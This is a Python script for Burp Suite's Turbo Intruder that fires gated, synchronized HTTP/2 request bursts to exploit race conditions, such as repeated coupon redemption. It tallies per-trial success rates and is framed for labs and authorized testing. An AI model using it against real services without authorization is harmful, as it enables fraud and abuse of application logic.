```python
"""
Turbo Intruder Race Condition Lab Runner
========================================

Purpose
-------
Experimental race-condition runner for:

    - PortSwigger Web Security Academy
    - Hack The Box laboratories
    - Local/self-hosted vulnerable applications
    - Authorized security testing

Design
------
The script intentionally uses Turbo Intruder as the HTTP engine
instead of implementing its own HTTP stack.

Features
--------
- HTTP/2 via Engine.BURP2
- Single-connection synchronization
- Gated request bursts
- Multiple burst sizes
- Multiple independent trials
- Shared-payload mode
- Unique-payload mode
- Per-trial result tracking
- Aggregate success-rate calculation
- Automatic completion detection
- Turbo Intruder result-table integration

Request template
----------------
Put the following marker at the value you want Turbo Intruder
to replace:

    RACE_CONDITION

Example:

    POST /redeem HTTP/2
    Host: lab.example
    Content-Type: application/x-www-form-urlencoded

    code=RACE_CONDITION

IMPORTANT
---------
Use only against systems you own or are explicitly authorized
to test.

The success detector MUST be adapted to the specific laboratory.
A HTTP 200 response is NOT automatically evidence of a race.
"""


import random
import string
import time


# ============================================================
# CONFIGURATION
# ============================================================

# Number of synchronized requests in each experiment.
#
# Example:
#
#   10 requests -> 10 trials
#   20 requests -> 10 trials
#   ...
#
BURST_SIZES = [10, 20, 30, 40, 50]


# Number of independent experiments for every burst size.
TRIALS_PER_SIZE = 10


# Delay between completed bursts.
#
# This is NOT the synchronization mechanism.
# Gates provide the synchronization.
#
BETWEEN_TRIALS = 0.15


# ------------------------------------------------------------
# Payload mode
# ------------------------------------------------------------
#
# True:
#   Every request inside a burst receives the SAME value.
#
# Useful for testing situations where several requests compete
# over the same logical resource/value.
#
# False:
#   Every request receives a UNIQUE value.
#
# Useful for testing collision/creation-style scenarios.
#
SAME_PAYLOAD = True


# Marker inside the request sent to Turbo Intruder.
MARKER = "RACE_CONDITION"


# Random token length.
TOKEN_LENGTH = 12


# ------------------------------------------------------------
# Turbo Intruder / HTTP2
# ------------------------------------------------------------

# BURP2 + one connection is the important combination for
# HTTP/2 single-packet race-condition testing.
CONCURRENT_CONNECTIONS = 1

REQUESTS_PER_CONNECTION = 100


# ============================================================
# EXPERIMENT STATE
# ============================================================

# Example:
#
# results["30"]["trial-4"]
#
# stores the outcome of burst size 30, trial 4.
#
results = {}


# Number of responses received by handleResponse().
responses_handled = 0


# Total number of requests that should be processed.
TOTAL_EXPECTED = (
    sum(BURST_SIZES) *
    TRIALS_PER_SIZE
)


# Avoid printing the final report twice.
summary_printed = False


# ============================================================
# TOKEN GENERATION
# ============================================================

def random_token(length=TOKEN_LENGTH):

    alphabet = (
        string.ascii_letters +
        string.digits
    )

    return ''.join(
        random.choice(alphabet)
        for _ in range(length)
    )


# ============================================================
# RESULT INITIALIZATION
# ============================================================

def initialize_experiment(size, trial):

    if size not in results:

        results[size] = {}

    trial_key = "trial-%d" % trial

    if trial_key not in results[size]:

        results[size][trial_key] = {
            "success": 0,
            "failure": 0,
            "total": 0,
        }


# ============================================================
# RESULT RECORDING
# ============================================================

def record_result(size, trial, success):

    initialize_experiment(
        size,
        trial
    )

    trial_key = "trial-%d" % trial

    data = results[size][trial_key]

    data["total"] += 1

    if success:

        data["success"] += 1

    else:

        data["failure"] += 1


# ============================================================
# SUCCESS DETECTOR
# ============================================================

def is_success(req):
    """
    Customize this function for your laboratory.

    This function answers:

        "Does this response provide evidence that the
         race condition occurred?"

    Do NOT use HTTP status alone unless that is genuinely
    the vulnerability condition.

    --------------------------------------------------------
    Example: JSON response
    --------------------------------------------------------

        return b'"status":"success"' in body

    --------------------------------------------------------
    Example: application-specific message
    --------------------------------------------------------

        return b"coupon redeemed" in body

    --------------------------------------------------------
    Example: status-based lab
    --------------------------------------------------------

        return req.status == 201

    Only use the last approach when the lab explicitly defines
    that status as the race-condition indicator.
    """

    if req.response is None:

        return False

    body = req.response.lower()

    # --------------------------------------------------------
    # EXAMPLE ONLY
    #
    # Replace these with the actual indicator for your lab.
    # --------------------------------------------------------

    success_indicators = [
        b"race_condition",
        b"redeemed",
    ]

    for indicator in success_indicators:

        if indicator in body:

            return True

    return False


# ============================================================
# LABEL PARSER
# ============================================================

def parse_label(label):
    """
    Expected label format:

        race:size=30:trial=7

    Returns:

        (30, 7)

    or:

        (None, None)
    """

    if not label:

        return None, None

    parts = label.split(":")

    size = None
    trial = None

    for part in parts:

        if part.startswith("size="):

            try:

                size = int(
                    part.split("=", 1)[1]
                )

            except:

                size = None

        elif part.startswith("trial="):

            try:

                trial = int(
                    part.split("=", 1)[1]
                )

            except:

                trial = None

    return size, trial


# ============================================================
# QUEUE REQUESTS
# ============================================================

def queueRequests(target, wordlist):

    engine = RequestEngine(

        endpoint=target.endpoint,

        concurrentConnections=(
            CONCURRENT_CONNECTIONS
        ),

        requestsPerConnection=(
            REQUESTS_PER_CONNECTION
        ),

        pipeline=False,

        engine=Engine.BURP2
    )


    # ========================================================
    # WARM-UP
    # ========================================================

    warmup_gate = "race-warmup"

    engine.queue(
        target.req,
        gate=warmup_gate,
        label="race:warmup"
    )

    engine.openGate(
        warmup_gate
    )


    # ========================================================
    # EXPERIMENT MATRIX
    # ========================================================

    for burst_size in BURST_SIZES:

        for trial in range(
            1,
            TRIALS_PER_SIZE + 1
        ):

            gate = (
                "race-size-%d-trial-%d"
                % (
                    burst_size,
                    trial
                )
            )


            label = (
                "race:size=%d:trial=%d"
                % (
                    burst_size,
                    trial
                )
            )


            # ------------------------------------------------
            # Shared payload
            # ------------------------------------------------

            if SAME_PAYLOAD:

                shared_token = random_token()

            else:

                shared_token = None


            # ------------------------------------------------
            # Queue entire burst BEFORE opening the gate.
            # ------------------------------------------------

            for request_number in range(
                burst_size
            ):

                if SAME_PAYLOAD:

                    token = shared_token

                else:

                    token = random_token()


                request = target.req.replace(
                    MARKER,
                    token
                )


                engine.queue(

                    request,

                    gate=gate,

                    label=label
                )


            # ------------------------------------------------
            # Release synchronized burst.
            # ------------------------------------------------

            engine.openGate(
                gate
            )


            # ------------------------------------------------
            # Give the application a small recovery window
            # before starting the next independent trial.
            # ------------------------------------------------

            if BETWEEN_TRIALS > 0:

                time.sleep(
                    BETWEEN_TRIALS
                )


# ============================================================
# FINAL REPORT
# ============================================================

def reportSummary():

    global summary_printed

    if summary_printed:

        return

    summary_printed = True


    print("")
    print("=" * 78)
    print(" RACE CONDITION LAB RESULTS")
    print("=" * 78)

    print(
        "%-10s %-10s %-10s %-10s %-14s"
        % (
            "Burst",
            "Success",
            "Failure",
            "Trials",
            "Success Rate"
        )
    )

    print("-" * 78)


    # --------------------------------------------------------
    # Aggregate each burst size.
    # --------------------------------------------------------

    for size in BURST_SIZES:

        success = 0
        failure = 0
        trials_with_results = 0


        size_results = results.get(
            size,
            {}
        )


        for trial_data in size_results.values():

            if trial_data["total"] == 0:

                continue


            trials_with_results += 1

            if trial_data["success"] > 0:

                success += 1

            else:

                failure += 1


        if trials_with_results > 0:

            success_rate = (
                success /
                trials_with_results
            ) * 100.0

        else:

            success_rate = 0.0


        print(
            "%-10d %-10d %-10d %-10d %12.2f%%"
            % (
                size,
                success,
                failure,
                trials_with_results,
                success_rate
            )
        )


    print("=" * 78)

    print(
        "Responses processed: %d / %d"
        % (
            responses_handled,
            TOTAL_EXPECTED
        )
    )


    print(
        "Payload mode: %s"
        % (
            "SHARED"
            if SAME_PAYLOAD
            else "UNIQUE"
        )
    )


    print("=" * 78)


    # --------------------------------------------------------
    # Detailed per-trial results
    # --------------------------------------------------------

    print("")
    print("DETAILED TRIAL RESULTS")
    print("-" * 78)


    for size in BURST_SIZES:

        size_results = results.get(
            size,
            {}
        )


        for trial in range(
            1,
            TRIALS_PER_SIZE + 1
        ):

            key = "trial-%d" % trial

            data = size_results.get(
                key
            )


            if data is None:

                continue


            total = data["total"]

            if total:

                rate = (
                    data["success"] /
                    total
                ) * 100.0

            else:

                rate = 0.0


            print(
                "burst=%-4d trial=%-3d "
                "requests=%-4d success=%-4d "
                "failure=%-4d rate=%6.2f%%"
                % (
                    size,
                    trial,
                    total,
                    data["success"],
                    data["failure"],
                    rate
                )
            )


    print("-" * 78)


# ============================================================
# RESPONSE HANDLER
# ============================================================

def handleResponse(req, interesting):

    global responses_handled

    responses_handled += 1


    # --------------------------------------------------------
    # Warm-up response
    # --------------------------------------------------------

    if req.label == "race:warmup":

        return


    # --------------------------------------------------------
    # Recover experiment identity.
    #
    # Turbo Intruder exposes req.label to handleResponse().
    # --------------------------------------------------------

    size, trial = parse_label(
        req.label
    )


    # --------------------------------------------------------
    # Unknown label.
    #
    # Keep the response visible but do not corrupt statistics.
    # --------------------------------------------------------

    if size is None or trial is None:

        table.add(
            req,
            interesting
        )

        return


    # --------------------------------------------------------
    # Classify response.
    # --------------------------------------------------------

    success = is_success(
        req
    )


    # --------------------------------------------------------
    # Record result.
    # --------------------------------------------------------

    record_result(
        size,
        trial,
        success
    )


    # --------------------------------------------------------
    # Add response to Turbo Intruder's result table.
    # --------------------------------------------------------

    table.add(
        req,
        interesting
    )


    # --------------------------------------------------------
    # Experiment completion.
    # --------------------------------------------------------

    if responses_handled >= TOTAL_EXPECTED:

        reportSummary()
```
